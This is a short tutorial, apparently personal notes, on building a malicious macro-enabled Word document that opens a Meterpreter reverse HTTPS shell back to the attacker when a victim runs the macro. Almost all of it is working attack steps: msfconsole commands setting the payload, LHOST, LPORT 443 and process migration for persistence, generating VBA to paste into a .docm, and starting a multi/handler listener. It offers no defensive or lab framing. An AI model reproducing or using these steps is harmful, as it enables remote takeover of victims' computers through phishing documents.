Need a malicious, macro enabled document that will create a remote connection back to Metasploit when a user opens it and runs the macro (Office document)
Metasploit as it does all the hard work of creating the attack and then handling the connect-back once the document has been opened.

	type "msf
console"

type " use windows/meterpreter/reverse_https "
	
	metasploit will use the reverse TCP shell payload

type " set LHOST <your Kali IP> "

	This will tell the payload what IP to connect to (i.e. where you want the victim to connect back to)

type " set LPORT 443 "

	This will tell the payload what port to use to connect. 

type " set AutoRunScript post/windows/manage/smart_migrate "

	Will migrate your remote connection from the Word process to a different process such as the Explorer process,if the document closes you will still have your connection.


type " generate -f vba "

	Generates some basic VBA code that you can simply copy from the terminal window to paste in a document.



	 ** Setting up the document **

1. On Kali copy everything from “#If Vba7 Then” to the final “End Sub”
2. In Word go to the " View " tab and select " Macros ".
3. In the VBA code page that opens highlight all the text and delete it, then paste your code you copied from Metasploit.
4. Save the document as a .docm or Word Macro-Enabled Document in a folder on the computer.









		** Setting up the receiver **

open a terminal window and type msfconsole and hit enter to open Metasploit.

type " msfconsole "



type " use exploit/multi/handler "

	This will tell Metasploit to use the multi handler exploit


type " set PAYLOAD windows/meterpreter/reverse_https "

	Tells the multi handler what payload to expect, since we are using a reverse_https payload in the macro enabled document we tell it to use that


type " set LHOST <your Kali IP > "

	This will tell the handler what IP to listen on

type " set LPORT 443 "

	 Tell the handler what port to listen on. I like using 443 or 80 as in a real situation these are likely to be open for users to connect to the internet from.

type " exploit "
